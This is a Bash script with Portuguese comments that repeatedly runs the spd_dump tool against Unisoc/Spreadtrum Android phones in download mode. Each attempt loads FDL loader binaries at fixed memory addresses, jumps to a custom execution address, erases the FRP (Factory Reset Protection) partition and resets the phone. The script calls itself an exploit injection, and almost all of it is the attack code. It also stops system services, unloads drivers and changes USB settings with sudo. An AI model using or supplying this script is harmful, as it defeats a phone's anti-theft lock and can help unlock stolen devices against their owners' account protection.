#!/bin/bash

# Cores
GREEN='\033[0;32m'
RED='\033[0;31m'
NC='\033[0m'

echo -e "${GREEN}=== MARTELO UNISOC PURO (BASH SPEED) ===${NC}"

# 1. Configurações de Força (USB não dorme)
sudo systemctl stop ModemManager 2>/dev/null
sudo modprobe -r usbserial 2>/dev/null
sudo modprobe -r cdc_acm 2>/dev/null
echo -1 | sudo tee /sys/module/usbcore/parameters/autosuspend > /dev/null

cd /home/krisluar/spreadtrum_flash

echo -e "\n[*] Aguardando celular..."
echo -e "[*] Procedimento: Segure VOLUME BAIXO (ou VOL UP+DOWN) e conecte o cabo."

# 2. Loop Infinito de Injeção
count=0
while true; do
    # --wait 0 para o spd_dump não ficar esperando (ele tenta e sai na hora)
    # 2>/dev/null para o terminal não ficar poluído com erros
    ./spd_dump --wait 0 fdl fdl1-dl.bin 0x65000800 fdl fdl2-dl.bin 0x9efffe00 exec_addr 0x65015f08 exec e frp reset 2>/dev/null
    
    # Se o comando retornar 0, significa que funcionou!
    if [ $? -eq 0 ]; then
        echo -e "\n\n${GREEN}!!! SUCESSO !!!${NC}"
        echo "Exploit injetado com sucesso."
        exit 0
    fi

    # Contador visual simples
    ((count++))
    if (( count % 100 == 0 )); then
        echo -ne "[*] Tentativas: $count...\r"
    fi
done
